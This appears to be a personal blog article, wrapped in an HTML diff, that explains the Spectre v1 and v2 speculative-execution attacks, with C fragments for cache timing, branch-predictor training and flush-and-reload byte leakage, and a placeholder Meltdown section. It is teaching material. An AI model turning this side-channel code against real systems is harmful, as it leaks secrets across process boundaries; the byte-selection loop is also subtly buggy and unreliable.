@@ -1,0 +1,412 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Spectre and Meltdown :: quixel200</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Spectre and Meltdown You might have heard of Spectre and Meltdown back in 2018&hellip; although I was able to understand the vulnerability and why it worked, my search for an implementation of it along with a proper explanation eluded me. So I decided to write one myself.
+What is Spectre? Spectre tricks a completely error-free program into leaking its secrets.
+What is Meltdown? Meltdown breaks the process isolation between user applications and the operating system, allowing you to leak memory of any other process.
+" />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="https://quixel200.github.io/articles/spectre_and_meltdown/" />
+
+
+
+
+
+  
+  <link rel="stylesheet" href="https://quixel200.github.io/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css">
+
+  
+  <link rel="stylesheet" href="https://quixel200.github.io/css/code.min.d529ea4b2fb8d34328d7d31afc5466d5f7bc2f0bc9abdd98b69385335d7baee4.css">
+
+  
+  <link rel="stylesheet" href="https://quixel200.github.io/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css">
+
+  
+  <link rel="stylesheet" href="https://quixel200.github.io/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css">
+
+  
+  <link rel="stylesheet" href="https://quixel200.github.io/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css">
+
+  
+  <link rel="stylesheet" href="https://quixel200.github.io/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css">
+
+  
+  <link rel="stylesheet" href="https://quixel200.github.io/css/main.min.36833afd348409fc6c3d09d0897c5833d9d5bf1ff31f5e60ea3ee42ce2b1268c.css">
+
+  
+  <link rel="stylesheet" href="https://quixel200.github.io/css/menu.min.3c17467ebeb3d38663dce68f71f519901124fa5cbb4519b2fb0667a21e9aca39.css">
+
+  
+  <link rel="stylesheet" href="https://quixel200.github.io/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css">
+
+  
+  <link rel="stylesheet" href="https://quixel200.github.io/css/post.min.e6dddd258e64c83e05cec0cd49c05216742d42fc8ecbfbe6b67083412b609bd3.css">
+
+  
+  <link rel="stylesheet" href="https://quixel200.github.io/css/syntax.min.a0773cce9310cb6d8ed23e50f005448facf29a53001b57e038828daa466b25c0.css">
+
+  
+  <link rel="stylesheet" href="https://quixel200.github.io/css/terminal.min.9fbf3bb2b839ebe2f0878d4cf1ca7b5ff995854fb4eb5b15f0347674163bb8b4.css">
+
+  
+  <link rel="stylesheet" href="https://quixel200.github.io/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css">
+
+
+
+
+
+
+
+<link rel="shortcut icon" href="https://quixel200.github.io/favicon.png">
+<link rel="apple-touch-icon" href="https://quixel200.github.io/apple-touch-icon.png">
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="website" />
+<meta property="og:title" content="Spectre and Meltdown">
+<meta property="og:description" content="Spectre and Meltdown You might have heard of Spectre and Meltdown back in 2018&hellip; although I was able to understand the vulnerability and why it worked, my search for an implementation of it along with a proper explanation eluded me. So I decided to write one myself.
+What is Spectre? Spectre tricks a completely error-free program into leaking its secrets.
+What is Meltdown? Meltdown breaks the process isolation between user applications and the operating system, allowing you to leak memory of any other process.
+" />
+<meta property="og:url" content="https://quixel200.github.io/articles/spectre_and_meltdown/" />
+<meta property="og:site_name" content="quixel200" />
+
+  <meta property="og:image" content="https://quixel200.github.io/og-image.png">
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+  <meta property="article:published_time" content="2025-08-18 10:24:19 &#43;0530 IST" />
+
+
+
+
+  <link href="/articles/spectre_and_meltdown/index.xml" rel="alternate" type="application/rss+xml" title="quixel200" />
+
+
+
+
+
+
+
+
+
+</head>
+<body>
+
+
+<div class="container center">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    Terminal
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/articles">Articles</a></li>
+        
+      
+        
+          <li><a href="/notes">Notes</a></li>
+        
+      
+        
+          <li><a href="/projects">Projects</a></li>
+        
+      
+        
+          <li><a href="/writeups">Writeups</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/articles" >Articles</a></li>
+        
+      
+        
+          <li><a href="/notes" >Notes</a></li>
+        
+      
+        
+          <li><a href="/projects" >Projects</a></li>
+        
+      
+        
+          <li><a href="/writeups" >Writeups</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+  
+    <div class="index-content">
+      <h1 id="spectre-and-meltdown">Spectre and Meltdown</h1>
+<p>You might have heard of Spectre and Meltdown back in 2018&hellip; although I was able to understand the vulnerability and why it worked, my search for an implementation of it along with a proper explanation eluded me. So I decided to write one myself.</p>
+<h1 id="what-is-spectre">What is Spectre?</h1>
+<p>Spectre tricks a completely error-free program into leaking its secrets.</p>
+<h1 id="what-is-meltdown">What is Meltdown?</h1>
+<p>Meltdown breaks the process isolation between user applications and the operating system, allowing you to leak memory of any other process.</p>
+<h1 id="your-life-is-a-lie">Your life is a lie</h1>
+<p>Let&rsquo;s first break some assumptions that you might have had about the way assembly instructions are executed on the CPU.</p>
+<ul>
+<li>The CPU does not execute instructions in order. It can &ldquo;speculate&rdquo; and guess which branch might be taken and execute it ahead of time.</li>
+<li>Instructions are fetched and decoded to micro-operations(μOPs), These micro-operations operate on &ldquo;virtual&rdquo; registers, and the result is only written to the real register afterwards.</li>
+<li>Memory access does not always go to the main memory, i.e, the RAM. It is first checked in the CPU cache.</li>
+</ul>
+<h1 id="cpus-are-fast-really-fast">CPUs are fast&hellip; really fast</h1>
+<p>Modern CPUs can often process billions of instructions in a seconds. Compared to the speed at which a CPU can execute instructions&hellip; fetching memory is way slower.</p>
+<p>So the CPU has a lot of optmizations that ensure that it is not idle when an instruction requires memory to be fetched or written. The important ones for this exploit are:</p>
+<ul>
+<li>
+<p><strong>Speculative Execution:</strong>  If the CPU encounters a branch, say an <code>if</code> statement. It doesn&rsquo;t wait for the evaluation of the condition. It tries to guess the correct path using sosmething called the branch predictor&hellip; It saves a lot of time when its right,if not, it just restores the CPU state.</p>
+</li>
+<li>
+<p><strong>Out of Order Execution:</strong> The CPU executes instructions as soon as the data required for the instructions are ready and does not wait for the previous instruction to finish. This ties into the micro-operations that I mentioned earlier.</p>
+</li>
+</ul>
+<h1 id="cache-as-a-side-channel">Cache as a side channel!??</h1>
+<p>When a memory address is accessed for the first time, it is placed in the cache. When the same memory addressis accessed again, it is fetched from the cache directly. There is a noticable time difference when you compare the time taken to fetch the address from cache compared to fetching from the RAM.</p>
+<pre tabindex="0"><code>      CPU
+       |
+       v
+check cache for address (takes less time if find)
+       |
+       v
+Go to RAM if not found (place that value in cache for later use)
+</code></pre><p>This is essentially a side channel that can be used to determine if the victim process accessed some memory address. That&rsquo;s cool, but how do we actually exfiltrate data?.
+Before we get to that, let&rsquo;s look at how to time the cache.</p>
+<p>We are going to have to use some instructions that can influence CPU behaviour for this to work.</p>
+<ul>
+<li><code>_mm_lfence</code> - waits for memory loads to be completed.</li>
+<li><code>_mm_sfence</code> - waits for memory stores to be completed.</li>
+<li><code>_mm_mfence</code> - waits for all memory operations to be completed.</li>
+<li><code>__rdtsc</code> - read the processor time-stamp (By calling __rdtsc() before and after a section of code, the difference in the returned values estimates the number of CPU cycles consumed).</li>
+<li><code>_mm_clfush()</code> - flushes the CPU cache line, essentially removing the provided memory from the cache.</li>
+</ul>
+<h1 id="flush-and-reload">Flush and reload</h1>
+<ul>
+<li>First, we clear the cache line of the memory.</li>
+<li>We then let the victim program run.</li>
+<li>We can then check the time taken to access the memory, if it&rsquo;s low&hellip; we can infer that it was accessed by the victim.</li>
+</ul>
+<p>We will use the following function to time our access. We add a <code>_mm_mfence()</code> to ensure memory access is completed to get a more accurate reading.</p>
+<h2 id="measure-access-time-function">measure access time function</h2>
+<pre tabindex="0"><code>uint64_t measure_access_time(void *addr) {
+    volatile uint64_t start, end;
+    _mm_mfence();
+    start = __rdtsc();
+    volatile int value = *(volatile int *)addr;
+    _mm_mfence();
+    end = __rdtsc();
+    return (end - start);
+}
+</code></pre><p>Now let&rsquo;s see the difference between a cache hit and a cache miss.</p>
+<pre tabindex="0"><code>#include &lt;stdio.h&gt;
+#include &lt;stdint.h&gt;
+#include &lt;x86intrin.h&gt; /* Required for _mm_clflush and __rdtscp */
+
+int target_data = 1337;
+
+
+int main() {
+    _mm_clflush(&amp;target_data);
+    uint64_t miss_latency = measure_access_time(&amp;target_data);
+    printf(&#34;[Uncached] Time to access data from RAM:   %lu cycles\n&#34;, miss_latency);
+    // after the first cache miss, the memory should now be in the cache
+    uint64_t hit_latency = measure_access_time(&amp;target_data);
+    printf(&#34;[Cached]   Time to access data from Cache: %lu cycles\n&#34;, hit_latency);
+    return 0;
+}
+</code></pre><h2 id="the-output">The output</h2>
+<pre tabindex="0"><code>Run 1:
+[Uncached] Time to access data from RAM:   236 cycles
+[Cached]   Time to access data from Cache: 80 cycles
+
+Run 2:
+[Uncached] Time to access data from RAM:   208 cycles
+[Cached]   Time to access data from Cache: 104 cycles
+
+Run 3:
+[Uncached] Time to access data from RAM:   216 cycles
+[Cached]   Time to access data from Cache: 112 cycles
+
+Run 4:
+[Uncached] Time to access data from RAM:   224 cycles
+[Cached]   Time to access data from Cache: 100 cycles
+</code></pre><p>We can clearly that it takes almost double the time to access memory that is not in the cache.</p>
+<h2 id="how-do-we-actually-use-this-information">How do we actually use this information?</h2>
+<ul>
+<li>We know that if a victim accesses some address, we can leak it using flush and reload.</li>
+<li>Now we create a memory region that consists of 256 pages, each page corresponding to a byte.</li>
+<li>We then let the victim access a specific page(a page is just 0x1000 bytes of memory) based on the secret byte we want.</li>
+<li>For example, if the secret was &lsquo;c&rsquo;, it would access page 99(ascii for &lsquo;c&rsquo;).</li>
+<li>We can then time the access to see which page was accessed by the victim.</li>
+<li>We then flush all pages from the cache and repeat the process for the next byte.</li>
+</ul>
+<h1 id="the-branch-predictor">The branch predictor</h1>
+<p>Consider the following code snippet, where x is user-controllede input.</p>
+<pre tabindex="0"><code>int array1_size = 1;
+char *array1 = &#34;flag{secret}&#34;;
+if (x &lt; array1_size){
+    y = array2[array1[x] * 4096];
+}else{
+    y = 0;
+}
+</code></pre><ul>
+<li>We will set the array1_size to 1 to simulate a out-of-bounds access.</li>
+<li>to simply this attack, we shall consider array1 to be the secret we want to leak.</li>
+<li>array2 is 1MB of mapped memory (256 pages of 4096 bytes each).</li>
+</ul>
+<p>Assume that x contains user-controlled data,To ensure that we access memory.</p>
+<p>We can leak the first byte of the secret by setting x to 0(in bounds) and then performing a flush and reload. What about the rest? We would need to access memory that is out of bounds due to the constraints of the program.</p>
+<p>This is where the branch predictor comes in. Before the result of the bounds check is known, the CPU uses the branch predictor to guess the most probable branch and executes it speculatively. Overall, guessing the branch to be taken leads to faster execution times.</p>
+<p>But what if the branch predictor is wrong? The CPU will then restore the state to before the speculative instructions executed, <strong>but</strong> it does not clear the cache, meaning that the address that was accessed speculatively is still in the cache.</p>
+<h1 id="fooling-the-branch-predictor">Fooling the branch predictor</h1>
+<p>We can essentially fool the branch predictor by giving it a valid index multiple times. The branch predictor then goes: &ldquo;Hey, this branch was taken 10 times, surely it will be taken this time too!&rdquo; and it speculatively executes the branch.
+<img src="/articles/spectre_and_meltdown/images/branch_predictor.jpg" alt="branch predictor"></p>
+<p>So esentially our exploit becomes</p>
+<ul>
+<li>train the branch predictor with a valid index.</li>
+<li>provide an invalid index, but it will still be speculatively executed.</li>
+<li>measure the access time taken for each index in our mapped memory.</li>
+<li>and voila, you have your secret.</li>
+</ul>
+<h2 id="training-the-branch-predictor">Training the branch predictor</h2>
+<pre tabindex="0"><code>for(int t=0;t&lt;TRAIN_ROUNDS;t++){
+    x = 1;
+    _mm_mfence();
+    access_array(x);
+    _mm_mfence();
+}
+</code></pre><p>Once we train the branch predictor, we can then provide our invalid index.</p>
+<pre tabindex="0"><code> for(int r=0;r&lt;ATTACK_ROUNDS;r++){
+    for(int i=0;i&lt;256;i++){
+        _mm_clflush(&amp;mapped_mem[i * PAGE_SIZE]); // flush the cache line to remove previous entries.
+    }
+    _mm_mfence();
+    x = invalid_index;
+    _mm_mfence();
+    access_array(x);
+ }
+</code></pre><h2 id="extracting-the-leaked-byte">extracting the leaked byte</h2>
+<pre tabindex="0"><code> for(int i=0;i&lt;256;i++){
+    int mix_i = ((i * 167) + 13) &amp; 255; // prevent CPU from pre-fetching the counter and messing up our results.
+    uint64_t time = time_access(&amp;mapped_mem[mix_i * PAGE_SIZE]);
+    if(time &lt; 150 ){
+        stats[mix_i]++;
+    }
+}
+int max = 0;
+int leaked = 0;
+for(int i=32;i&lt;256;i++){ // only consider valid ascii, hence the 32 starting range.
+if(stats[i]){
+    max = stats[i];
+    leaked = i;
+    }
+}
+</code></pre><p>This is essentially what is known as a <strong>spectre v1</strong> attack. Putting all the pieces together, you can run the exploit yourself on a vulnerabile CPU(I highly recommend doing the pwn.college module).</p>
+<h2 id="spectre-v2">Spectre v2</h2>
+<p>Spectre v2 is really similar to v1, but instead of a branch predictor, we fool an indirect branch instruction. For example,</p>
+<pre tabindex="0"><code>call rax
+</code></pre><p>where rax is calculated during runtime. This requires you to find a spectre gadget, which is essentially</p>
+<pre tabindex="0"><code>y = array2[array1[x] * 4096];
+</code></pre><p>Now you follow the same steps as v1, and you can leak the secret.</p>
+<p>This type of indirect branching is commonly seen when using function pointers that are resolved at runtime.</p>
+<h1 id="meltdown">Meltdown</h1>
+<p>soon&hellip;</p>
+<p>This is a combination of the content taught at <a href="https://pwn.college/system-security/speculative-execution/">pwn.college&rsquo;s microarchitecture exploitation module</a> and the <a href="https://spectreattack.com/">actual papers that were released</a>. I highly recommend that you try the challenges and read the papers for yourself.</p>
+
+    </div>
+  
+  <div class="posts">
+    
+
+    <div class="pagination">
+  <div class="pagination__buttons">
+    
+    
+    
+  </div>
+</div>
+
+  </div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2026 Powered by <a href="https://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
